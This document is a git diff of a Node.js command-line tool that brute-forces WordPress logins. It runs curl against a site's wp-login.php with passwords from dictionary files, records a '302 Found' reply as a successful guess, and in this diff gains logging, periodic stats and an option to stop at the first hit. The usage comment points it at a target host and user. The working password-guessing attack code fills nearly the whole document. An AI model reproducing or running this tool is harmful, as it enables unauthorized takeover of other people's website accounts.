@@ -1,19 +1,25 @@
 #!/usr/bin/env node
 // node ./ -d ./~dicts/ -h 'http://www.example.com' -r
-// 
+// node /Users/ahulce/Dropbox/hacks/wplogin/ -h 'http://www.xxx.com' -u hope -v -s30 -r
 
 var fs = require('fs')
 ,split = require('split')
 ,path = require('path')
 ,through = require('through')
-,cp = require('child_process').spawn
+,sext = require('sext')
 ,argv = require('minimist')(process.argv.slice(2))
+,ut = require('./ut.js')
+,logger = require('./logger.js')
 ,config = require('./config')
 ,matchKey = 'Match!'
 ,verbose = !!argv.v
+,intervalSeconds = argv.s ? +argv.s : null
 ,host = argv.h || ''
 ,loginPath = argv.p || '/wp-login.php'
 ,user = encodeURIComponent(argv.u || 'admin')
+,quitOnFind = !!argv.r
+,logDir = config.logDir ? config.logDir : __dirname+'/logs/'
+,logFile
 ,dictFile = argv.d || __dirname+'/dict.example'
 ,dictDir
 ,checked = {}
@@ -29,14 +35,14 @@ var fs = require('fs')
 	,matches: []
 }
 ;
-
-console.log(['host: '+host, 'loginPath: '+loginPath, 'user: '+user, 'dictFile: '+dictFile, 'config: '+JSON.stringify(config)/*, 'cmd: '+cmd*/].join('\n'),'\n');
-
-handleProcessErrors();
-if (verbose)
-	startStatsInterval();
+console.log(['host: '+host, 'loginPath: '+loginPath, 'user: '+user, 'dictFile: '+dictFile, 'verbose: '+verbose, 'intervalSeconds: '+intervalSeconds, 'logDir: '+logDir, 'config: '+JSON.stringify(config)/*, 'cmd: '+cmd*/].join('\n'),'\n');
 
 stats.timeStart = new Date;
+startStatsInterval(intervalSeconds);
+logger.create();
+//handleProcessErrors();
+
+
 fs.stat(dictFile,function(err,stat){
 	if (err)
 		return console.log('Error reading dict', err);
@@ -58,40 +64,61 @@ fs.stat(dictFile,function(err,stat){
 		return console.log('Dict path is not a file or directory');
 	}
 	through(checkDicts).on('attemptReceived',function(err,data){
-		//console.log('attemptReceived',err,data);
 		if (err)
 			console.log('Attempt Error', err);
+		if (data && quitOnFind) {
+			console.log('should be quitting now...');
+			showResults();
+		}
 	}).on('fileRead',function(err,data){
 		if (err)
 			console.log('File Read Error', err);
 	}).on('end',showResults).write(files);
 });
 
-function showResults(err){
-	stopStatsInterval();
-	if (err)
-		console.log('\n------------ Error! ------------\n',err);
-	else
-		console.log('\n------------ El Fin ------------\n');
-	stats.timeEnd = new Date;
-	stats.timeStart = stats.timeStart.toString();
-	stats.timeEnd = stats.timeEnd.toString();
-	console.log(stats,'\n');
-	if (err)
-		throw err;
-}
-
 function handleProcessErrors(){
 	process.on('SIGINT',showResults);
 	process.on('uncaughtException',showResults);
 }
 
-function startStatsInterval(){
-	statsInterval = setInterval(function(){
-		console.log('\n----------------------------\n');
-		console.log(stats);
-		console.log('\n----------------------------\n');
-	},10000);
+function prettifyStats(){
+	var cpy = sext({},stats);
+	if (cpy.timeStart)
+		cpy.timeStart = ut.prettyTime(cpy.timeStart);
+	if (cpy.timeEnd)
+		cpy.timeEnd = ut.prettyTime(cpy.timeEnd);
+	return '\n\n----------------------------\n\n'
+		+ ut.prettyTime()+'\n\n'
+		+ JSON.stringify(cpy)
+		+ '\n\n----------------------------\n\n'
+	;
+}
+
+function showResults(err){
+	stopStatsInterval();
+	err
+		? console.log('\n------------ Error! ------------\n',err)
+		: console.log('\n------------ El Fin ------------\n')
+	;
+	console.log(prettifyStats(),'\n');
+	console.log(JSON.stringify(Object.keys));
+	if (err) {
+		if (err.message && err.name && err.stack)
+				throw err;
+		console.log('ERR',err);
+	}
+	process.kill();
+}
+
+function startStatsInterval(secs){
+	stopStatsInterval();
+	statsInterval = setTimeout(function(){
+		if (verbose)
+			console.log(prettifyStats());
+		logger.update();
+		stopStatsInterval();
+		statsInterval = setTimeout(startStatsInterval,secs*1000)
+	},secs*1000);
 }
 
 function stopStatsInterval(){
@@ -177,7 +204,7 @@ function checkAuth(user,pass,cb){
 	,'--compressed'
 	];
 	// can make faster by killing the process after stdErr is done
-	spawn(cmd,args,function(err,stdOut,stdErr){
+	ut.spawn(cmd,args,function(err,stdOut,stdErr){
 		var match = null;
 		//console.log('stdErr', stdErr);
 		if (!err && stdErr.indexOf('302 Found') != -1) {
@@ -192,25 +219,4 @@ function checkAuth(user,pass,cb){
 }
 
 
-function spawn(cmd,args,cb){
-	var exitCode ,errs = [] ,outs = [] ,c = 3
-	,proc = cp(cmd,args).on('exit',function(code){
-		exitCode = code;
-		done();
-	});
-	proc.stderr.on('data',function(data){
-		errs.push(data);
-	}).on('end',done);
-	proc.stdout.on('data',function(data){
-		outs.push(data);
-	}).on('end',done);
-	function done(){
-		if (--c)
-			return;
-		var err = errs.length ? Buffer.concat(errs).toString() : false
-		,out = outs.length ? Buffer.concat(outs).toString() : ''
-		;
-		if (cb)
-			cb(exitCode||false,out,err);
-	}
-}
+
